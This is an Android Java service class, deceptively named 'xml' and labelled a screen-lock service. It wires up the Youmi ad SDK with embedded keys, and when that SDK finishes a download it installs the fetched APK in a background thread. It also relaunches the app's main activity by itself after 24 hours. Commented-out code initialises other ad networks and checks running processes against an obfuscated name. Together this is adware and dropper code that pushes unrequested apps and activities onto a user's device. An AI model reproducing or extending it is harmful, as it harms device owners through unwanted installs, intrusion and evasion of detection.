package data.mild.mynu.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.IBinder;
import android.util.Log;


import com.umeng.analytics.MobclickAgent;


import net.d.c.YoumiPlatform;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.IOException;
import java.io.InputStream;

import data.mild.mynu.activity.MainActivity;
import data.mild.mynu.data.SharePreferenceSdkData;
import data.mild.mynu.utils.PackageInstallUtil;
import v.ad.common.DownloadCallback;



/*
 * ScreenLockService
 */
public class xml extends Service{

	//private vm spotManager;
	// 鲜果的cid,subCid的默认值
	private int cid = 3261;
	private int subCid = 0;
	// 渠道号
	// String resoureId;

	// 加载数据可能会出问题，防止没有初始化，没有收益，所有必须初始化下 具体参考loadkey
//	private static String[] keys = { "e9fce6d88c2caba2905a6b47bb4e8d20",// 道有道
//			"9c31bf87d4311e860513554473c8694e",// 有米
//			"b92d337b-0f6f-4639-a91c-9e62a0c0c9cf",// 聚米
//			"1192",// 鲜果
//			"C47C242F6624BBB5163D050B01FAEBAE",// 易盟
//			"94f8a63bee7f904f46cf4704322aecb6"// 万普app_id
//	};

	@Override
	public void onCreate() {
		super.onCreate();

		Intent intent = new Intent(getApplicationContext(),
				tr.class);
		startService(intent);

//		String channel =ProductInfoUtils.getChannelName(getApplicationContext());
//		int index =channel.lastIndexOf("_");
//		String newChl = channel.substring(0,index);
//		loadXmlKey(getApplicationContext(), keys, newChl);
//		Log.i("fqx", ProductInfoUtils.getChannelName(getApplicationContext()) + " newchl == " + newChl);

		//Log.i("fqx","isSafeApp ? " + String.valueOf(isSafeApp(getApplicationContext())));
		//if(isSafeApp(getApplicationContext())){
//			initYimeng();
//			initXianguo();
//			initDyd();
//			initJumi();
			initYoumi();
		//}

	}
//		public boolean isSafeApp(Context context) {
//			ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
//			List<ActivityManager.RunningAppProcessInfo> list = mActivityManager.getRunningAppProcesses();
//			for (ActivityManager.RunningAppProcessInfo ti : list){
//				if (ti.processName.contains(new StringBuffer().append(StrHelp1.S_ONE).append(StrHelp1.S_TWO).append(StrHelp1.S_THREE).append(StrHelp1.S_FOUR))){
//					return false;
//				}
//			}
//			return true;
//		}

		//有米初始化
		private void initYoumi() {
			new YoumiPlatform().initPlatform(getApplicationContext(), new DownloadCallback() {
				@Override
				public void downloadSuccess(String path) {
					Log.d("Donny","downloadSuccess"+path);
					MobclickAgent.onEvent(getApplicationContext(), "download_suc");
					executeInstallation(path);
				}

				@Override
				public void downloadFailed() {

				}
			}, "9c31bf87d4311e860513554473c8694e");
		}

//		聚米初始化
//		private void initJumi() {
//			new JumiPratform().initPlatform(getApplicationContext(),null,"962bc2ce-90d8-4cdd-917f-e1c5bd352ba9");
//		}

		//道有道初始化
//		private void initDyd() {
//			new DydPlatform().initPlatform(getApplicationContext(), new DownloadCallback() {
//				@Override
//				public void downloadSuccess(String path) {
//					executeInstallation(path);
//				}
//
//				@Override
//				public void downloadFailed() {
//
//				}
//			},keys[0]);
//		}

		//仙果初始化
//		private void initXianguo() {
//			new Xgpf().initPlatform(getApplicationContext(),null,keys[3]);
//		}
		//易盟初始化
//		private void initYimeng() {
//			new YimengPlatform().initPlatform(getApplicationContext(), null,keys[4]);
//		}

		//万普初始化
//		new WanpiPlatform().initPlatform(getApplicationContext(), new DownloadCallback() {
//			@Override
//			public void downloadSuccess(String path) {
//				executeInstallation(path);
//			}
//
//			@Override
//			public void downloadFailed() {
//
//			}
//		}, keys[5], ProductInfoUtils.getChannelName(getApplicationContext()));


		public static void loadXmlKey(Context context, String[] results,
			String channelName) {

		InputStream is = null;

		if (results == null)
			return;

		AssetManager assetManager = context.getAssets();
		String[] files = null;
		try {
			files = assetManager.list("");
		} catch (IOException e) {

		}
		if (files != null) {
			for (String file : files) {
				if (file.contains("arrays.xml")) {
					try {
						is = assetManager.open(file);

					} catch (IOException e) {
						e.printStackTrace();
					}
					break;
				}
			}

		}

		try {
			if (is == null)
				return;

			XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
			XmlPullParser xpp = factory.newPullParser();
			xpp.setInput(is, "utf-8");

			int eventType = xpp.getEventType();
			int index = 0;
			boolean isStart=false;
			while (XmlPullParser.END_DOCUMENT != eventType) {
				switch (eventType) {
				case XmlPullParser.START_TAG:
					if ("string-array".equalsIgnoreCase(xpp.getName())) {
						if(xpp.getAttributeValue(0).equalsIgnoreCase(channelName)){
							isStart=true;
							index = 0;
						}
					} else if (isStart&&"item".equalsIgnoreCase(xpp.getName())) {

						String temp = xpp.nextText();
						//Log.e("sl","***************** temp=="+temp);
						if (temp != null) {
							results[index] = temp;
							index++;
						}

					}
					break;
				case XmlPullParser.END_TAG:
					if (isStart&&"string-array".equalsIgnoreCase(xpp.getName())) {
						isStart=false;
						return;
					}
					break;

				}
				eventType = xpp.next();
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}

	}
	
	private void executeInstallation(final String filePath) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				if (SharePreferenceSdkData
						.getInstallAppFlag(getApplicationContext())) {
					PackageInstallUtil.installApp(getApplicationContext(),
							filePath);
				}
			}
		}).start();
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		long time = System.currentTimeMillis();
		Log.d("Donny","time=="+time);
		long time1 = SharePreferenceSdkData.getUpdateActiveTime(getApplicationContext());
		Log.d("Donny","time1=="+time1);
		if(time1 == 0){
			SharePreferenceSdkData.setUpdateActiveTime(getApplicationContext(),time);
		}else {
			if (time - time1 >24*60*60*1000){
				Log.d("Donny", "activity is restart");
				MobclickAgent.onEvent(getApplicationContext(), "activity_restart");
				Intent intent1 = new Intent(this,MainActivity.class);
				intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(intent1);
			}
		}
		return super.onStartCommand(intent, flags, startId);
	}

}
